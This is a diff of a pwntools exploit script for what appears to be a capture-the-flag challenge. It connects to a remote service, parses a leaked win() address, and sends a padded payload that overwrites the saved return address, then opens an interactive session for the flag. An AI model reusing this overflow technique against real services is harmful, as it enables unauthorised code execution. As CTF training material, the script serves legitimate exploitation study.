@@ -1,17 +1,21 @@
 from pwn import *
 
-# Start the process
-p = process('./challenge1') #### name of the executable
+# Connect to the server
+p = remote("localhost", 12345) #make sure to get the server ip instead of localhost
 
-# Address of the win function
-win_address = 0x401136  # Use `objdump -d challenge1` to the Win function address
+# Leak the address of win()
+p.recvuntil("Address of win(): ")
+win_addr = int(p.recvline().strip(), 16)
+log.info(f"Address of win(): {hex(win_addr)}")
 
 # Craft the payload
-payload = b"A" * 72  # Fill the buffer and overwrite the saved frame pointer
-payload += p64(win_address)  # Overwrite the return address
+payload = b"A" * 64          # Fill the buffer
+payload += b"B" * 8           # Overwrite saved base pointer
+payload += p64(win_addr)      # Overwrite return address with win() address
 
 # Send the payload
 p.sendline(payload)
 
-# Print the output
-print(p.recvall().decode())
+# Receive the flag
+p.interactive()
+
